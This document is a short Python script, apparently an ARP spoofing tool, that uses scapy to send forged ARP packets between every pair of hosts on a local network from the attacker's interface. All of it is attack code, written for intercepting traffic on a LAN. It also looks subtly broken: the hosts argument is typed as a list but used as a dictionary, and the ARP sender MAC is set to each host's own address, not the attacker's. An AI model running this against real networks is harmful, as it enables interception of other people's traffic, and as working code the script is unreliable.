from scapy.all import *
from scapy.arch import get_if_hwaddr
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp


def poison(interface: str, hosts: list):
    macAttacker = get_if_hwaddr(interface)

    def sendPoison(srcIP: str, dstIP: str, srcMAC: str, dstMAC: str):
        arp = Ether() / ARP()
        arp[Ether].src = macAttacker
        arp[ARP].hwsrc = srcMAC
        arp[ARP].psrc =  srcIP
        arp[ARP].hwdst = dstMAC
        arp[ARP].pdst = dstIP

        sendp(arp, iface = interface)

    for host1 in hosts:
        for host2 in hosts:
            if host1 != host2:
                for host1IP in hosts[host1]:
                    for host2IP in hosts[host2]:
                        sendPoison(host1IP, host2IP, host1, host2)